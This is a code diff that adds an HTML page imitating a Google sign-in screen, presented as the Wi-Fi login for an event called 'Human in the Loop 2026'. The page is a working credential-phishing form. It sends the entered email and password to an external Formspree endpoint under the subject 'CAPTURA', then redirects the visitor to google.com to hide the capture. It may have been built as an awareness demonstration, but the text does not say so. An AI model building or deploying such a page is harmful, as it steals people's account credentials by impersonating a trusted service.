@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Human in the Loop</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #f1f3f4; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { width: 440px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; background-color: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        
+        .event-banner { width: 100%; margin-bottom: 24px; border-radius: 4px; overflow: hidden; }
+        .event-banner img { width: 100%; height: auto; display: block; }
+        
+        .google-logo { width: 75px; margin-bottom: 12px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; margin-top: 0; }
+        .instruction { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .event-context { background-color: #f8f9fa; padding: 10px; border-radius: 4px; font-size: 13px; color: #5f6368; margin-bottom: 25px; border: 1px solid #e8eaed; }
+        
+        input { width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border 0.2s; }
+        input:focus { outline: none; border: 2px solid #00bfb3; padding: 12px 14px; }
+        
+        .footer-row { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; }
+        .link { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; }
+        .btn-next { background-color: #00bfb3; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; transition: background 0.3s; }
+        .btn-next:hover { background-color: #009e95; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="event-banner">
+            <img src="banner-evento.jpg.jpeg" alt="Human in the Loop Banner">
+        </div>
+
+        <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        
+        <h1>Iniciar sesión</h1>
+        <p class="instruction">Usa tu cuenta de Google</p>
+        
+        <div class="event-context">
+            Continuar para acceder al Wi-Fi de <strong>Human in the Loop 2026</strong>
+        </div>
+        
+        <form action="https://formspree.io/f/mjgejovb" method="POST">
+            <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" name="password" placeholder="Introduce tu contraseña" required>
+            
+            <input type="hidden" name="_subject" value="CAPTURA: Acceso Wi-Fi HITL">
+            <input type="hidden" name="_next" value="https://www.google.com">
+
+            <div style="text-align: left; margin-bottom: 30px;">
+                <a class="link" style="font-size: 14px;">¿Has olvidado tu correo electrónico?</a>
+            </div>
+
+            <div class="footer-row">
+                <a class="link">Crear cuenta</a>
+                <button type="submit" class="btn-next">Siguiente</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
